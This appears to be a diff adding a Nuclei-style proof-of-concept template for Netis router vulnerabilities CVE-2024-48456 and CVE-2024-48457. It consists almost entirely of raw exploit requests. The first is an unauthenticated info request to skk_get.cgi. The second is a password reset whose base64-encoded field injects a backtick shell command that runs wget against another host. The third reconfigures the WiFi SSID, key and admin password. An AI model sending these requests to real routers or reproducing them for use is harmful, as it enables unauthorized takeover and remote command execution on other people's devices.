@@ -1,0 +1,132 @@
+id: poc-twe50q380y85rmgl
+info:
+  name: Netis路由器漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/twe50q380y85rmgl'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: twe50q380y85rmgl
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /cgi-bin/skk_get.cgi HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:131.0) Gecko/20100101 Firefox/131.0
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 27
+
+    Connection: keep-alive
+
+
+    mode_name=skk_get&wl_link=0
+
+
+    CVE-2024-48456'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /cgi-bin/skk_set.cgi HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: password=SWwwdmVoYWNraW5n
+
+    Content-Length: 167
+
+    Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
+
+    Accept: text/plain, */*; q=0.01
+
+    Sec-Ch-Ua-Platform: "Linux"
+
+    X-Requested-With: XMLHttpRequest
+
+    Sec-Ch-Ua-Mobile: ?0
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Origin: [https://192.168.1.1](https://192.168.1.1)
+
+    Sec-Fetch-Site: same-origin
+
+    Sec-Fetch-Mode: cors
+
+    Sec-Fetch-Dest: empty
+
+    Referer: [https://192.168.1.1/password.html](https://192.168.1.1/password.html)
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: en-US,en;q=0.9
+
+    Priority: u=1, i
+
+    Connection: keep-alive
+
+
+    password=YHdnZXQgaHR0cDovLzE5Mi4xNjguMS4yYA%3D%3D&new_pwd_confirm=YHdnZXQgaHR0cDovLzE5Mi4xNjguMS4yYA%3D%3D&passwd_set=passwd_set&mode_name=skk_set&app=passwd&wl_link=0
+
+
+    CVE-2024-48457（密码重置）'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /cgi-bin/skk_set.cgi HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 251
+
+    Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
+
+    Accept: text/plain, */*; q=0.01
+
+    Sec-Ch-Ua-Platform: "Linux"
+
+    X-Requested-With: XMLHttpRequest
+
+    Sec-Ch-Ua-Mobile: ?0
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Origin: [https://192.168.1.1](https://192.168.1.1)
+
+    Sec-Fetch-Site: same-origin
+
+    Sec-Fetch-Mode: cors
+
+    Sec-Fetch-Dest: empty
+
+    Referer: [https://192.168.1.1/guide/welcome.html](https://192.168.1.1/guide/welcome.html)
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: en-US,en;q=0.9
+
+    Priority: u=1, i
+
+    Connection: keep-alive
+
+
+    wl2g_idx=6&wl5g_idx=0&wlanMode=0&wl_idx=0&ssid2g=bmV0aXMtMDAwMDAw&ssid5g=bmV0aXMtMDAwMDAwLTVH&encrypt=4&wpaPsk=SWwwdmVoYWNraW5n&wpaPskType=2&wpaPskFormat=0&password=SWwwdmVoYWNraW5n&autoUpdate=0&firstSetup=1&quick_set=ap&app=wan_set_shortcut&wl_link=0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
